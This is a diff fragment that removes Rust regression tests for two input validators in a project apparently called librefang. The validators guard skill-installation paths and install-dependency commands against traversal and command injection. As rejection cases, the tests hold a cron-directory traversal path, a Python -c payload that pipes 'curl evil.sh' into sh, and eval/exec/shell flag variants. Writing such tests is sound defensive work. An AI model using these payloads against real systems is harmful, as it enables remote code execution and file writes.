-    //! item. `install_skill` joins both `req.name` and `req.hand`
-    //! onto filesystem paths (`registry/skills/<name>/`,
-    //! `workspaces/hands/<hand>/`), so a missing validator made the
-    //! handler an FS-existence oracle (200 vs 404) and a write
-    //! primitive (`copy_dir_recursive` outside `~/.librefang/skills/`).
-    //! These tests pin the accept / reject envelope of
-    //! `validate_skill_identifier`.
-    use super::validate_skill_identifier;
-
-    #[test]
-    fn accepts_simple_names() {
-        for ok in ["weather", "weather-v2", "a", "Abc_DEF-123", "skill_42"] {
-            assert!(
-                validate_skill_identifier(ok, "name").is_ok(),
-                "expected '{ok}' to validate",
-            );
-        }
-    }
-
-    #[test]
-    fn rejects_dot_dot_traversal() {
-        let err = validate_skill_identifier("..", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_relative_traversal_payload() {
-        // The exploit literal from the audit doc.
-        let err = validate_skill_identifier("../../../etc/cron.daily/payload", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_forward_slash() {
-        let err = validate_skill_identifier("foo/bar", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_backslash() {
-        let err = validate_skill_identifier("foo\\bar", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_leading_dot() {
-        let err = validate_skill_identifier(".hidden", "name").unwrap_err();
-        assert!(
-            err.contains("invalid skill name"),
-            "leading-dot dotfile must be rejected; got {err:?}",
-        );
-    }
-
-    #[test]
-    fn rejects_leading_hyphen_and_underscore() {
-        for bad in ["-foo", "_foo"] {
-            let err = validate_skill_identifier(bad, "name").unwrap_err();
-            assert!(
-                err.contains("must start with"),
-                "leading non-alphanumeric '{bad}' must be rejected; got {err:?}",
-            );
-        }
-    }
-
-    #[test]
-    fn rejects_empty() {
-        let err = validate_skill_identifier("", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_too_long() {
-        let long = "a".repeat(65);
-        let err = validate_skill_identifier(&long, "name").unwrap_err();
-        assert!(
-            err.contains("1-64"),
-            "expected 1-64 length message; got {err:?}"
-        );
-    }
-
-    #[test]
-    fn rejects_non_ascii() {
-        // Unicode lookalikes (Cyrillic 'а' vs Latin 'a') would be a
-        // confusable-character attack vector. The validator is
-        // ASCII-only on purpose.
-        let err = validate_skill_identifier("\u{0430}weather", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_dots_inside_name() {
-        // `foo.bar` is rejected — dots have no place in skill ids
-        // (no extensions, no namespacing). Audit doc was explicit
-        // about leading-dot rejection; this extends to mid-string
-        // dots for defence in depth (path-normalisation edge cases
-        // with `./` segments).
-        let err = validate_skill_identifier("foo.bar", "name").unwrap_err();
-        assert!(err.contains("invalid skill name"), "got {err:?}");
-    }
-
-    #[test]
-    fn field_label_propagates_to_error_message() {
-        // When the validator is called on `hand`, the error must
-        // say "hand" so the client knows which payload field to
-        // fix. The handler relies on this to keep client errors
-        // actionable across both inputs.
-        let err = validate_skill_identifier("../oops", "hand").unwrap_err();
-        assert!(
-            err.contains("invalid skill hand"),
-            "expected 'hand' in message; got {err:?}",
-        );
-    }
-}
-
-#[cfg(test)]
-mod install_deps_argv_validation {
-    //! Regression guards for the `install-deps-rce-admin` audit item.
-    //!
-    //! `POST /api/hands/{hand_id}/install-deps` ran `Command::new(parts[0])`
-    //! against `install_deps` strings authored by Admin in HAND.toml. The
-    //! historical guard was a metacharacter blocklist (`;|&$\`><(){}\n\r`)
-    //! which an Admin could bypass with
-    //!     `install_deps = ["python", "-c", "import os; os.system('curl …')"]`
-    //! because the punctuation lives inside the quoted `-c` argument and
-    //! the top-level command string has none of the blocked characters.
-    //! This module pins the new (program-allowlist + flag-denylist)
-    //! envelope of `validate_install_deps_argv`.
-    use super::validate_install_deps_argv;
-
-    #[test]
-    fn accepts_legitimate_package_manager_commands() {
-        // Each entry mirrors a realistic per-platform `install_deps`
-        // string the handler would otherwise have rejected.
-        let ok = [
-            ("pip", vec!["install", "requests"]),
-            ("pip3", vec!["install", "--user", "yt-dlp"]),
-            ("npm", vec!["install", "-g", "typescript"]),
-            ("apt", vec!["install", "-y", "ffmpeg"]),
-            ("apt-get", vec!["install", "-y", "curl"]),
-            ("dnf", vec!["install", "-y", "ffmpeg"]),
-            ("pacman", vec!["-S", "--noconfirm", "ffmpeg"]),
-            ("brew", vec!["install", "ffmpeg"]),
-            (
-                "winget",
-                vec![
-                    "install",
-                    "Gyan.FFmpeg",
-                    "--accept-source-agreements",
-                    "--accept-package-agreements",
-                ],
-            ),
-            ("cargo", vec!["install", "ripgrep"]),
-        ];
-        for (prog, args) in ok {
-            assert!(
-                validate_install_deps_argv(prog, &args).is_ok(),
-                "expected '{prog} {args:?}' to validate"
-            );
-        }
-    }
-
-    #[test]
-    fn rejects_dash_c_payload_under_allowlisted_interpreter_alias() {
-        // The historical exploit literal from the audit doc. `python`
-        // is not allowlisted, so this fails at the program check first.
-        let err = validate_install_deps_argv(
-            "python",
-            &["-c", "import os; os.system('curl evil.sh | sh')"],
-        )
-        .unwrap_err();
-        assert!(err.contains("not in install-deps allowlist"), "got {err:?}");
-
-        // …and even if a future allowlist entry slips an interpreter in
-        // (regression guard), the `-c` flag check stops the payload.
-        // We pick `pip` as a stand-in: `pip -c …` is meaningless but
-        // proves the flag check fires independent of the program.
-        let err = validate_install_deps_argv("pip", &["-c", "anything"]).unwrap_err();
-        assert!(err.contains("disallowed flag"), "got {err:?}");
-        assert!(err.contains("-c"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_eval_and_exec_flag_variants() {
-        for flag in ["--eval", "--exec", "--shell", "--command", "-e"] {
-            let err = validate_install_deps_argv("npm", &[flag, "code"]).unwrap_err();
-            assert!(
-                err.contains("disallowed flag"),
-                "expected '{flag}' to be rejected; got {err:?}"
-            );
-        }
-        // `=value` long-form variants (e.g. `node --eval=…` style) — the
-        // bare-flag check would miss these since `--eval=foo != --eval`.
-        for combined in [
-            "--exec=touch /tmp/x",
-            "--shell=/bin/sh",
-            "--eval=process.exit(0)",
-            "--command=ls",
-        ] {
-            let err = validate_install_deps_argv("npm", &[combined]).unwrap_err();
-            assert!(
-                err.contains("disallowed flag"),
-                "expected '{combined}' to be rejected; got {err:?}"
-            );
-        }
-        // Case-insensitive: `--EVAL` and friends must still fail. A naive
-        // exact-match check would let an attacker bypass via casing.
-        let err = validate_install_deps_argv("npm", &["--EVAL", "x"]).unwrap_err();
-        assert!(err.contains("disallowed flag"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_absolute_unix_path() {
-        let err = validate_install_deps_argv("/bin/sh", &["-c", "id"]).unwrap_err();
-        assert!(err.contains("absolute path"), "got {err:?}");
-    }
-
-    #[test]
-    fn rejects_windows_backslash_paths() {
-        // Both the verbatim `\\?\C:\…` shape and a plain
-        // `C:\Windows\…` candidate trip the backslash check before
-        // the allowlist would otherwise miss them.
-        for prog in [
-            r"\\?\C:\Windows\System32\cmd.exe",
-            r"C:\Windows\System32\cmd.exe",
-            r"foo\bar",
-        ] {
-            let err = validate_install_deps_argv(prog, &["/c", "dir"]).unwrap_err();
-            assert!(
-                err.contains("absolute path"),
-                "expected '{prog}' rejected as absolute-path; got {err:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn rejects_non_allowlisted_program() {
-        for prog in ["python", "python3", "node", "ruby", "perl", "bash", "sh"] {
-            let err = validate_install_deps_argv(prog, &["install", "foo"]).unwrap_err();
-            assert!(
-                err.contains("not in install-deps allowlist"),
-                "expected '{prog}' rejected by allowlist; got {err:?}"
-            );
-        }
     }
 }
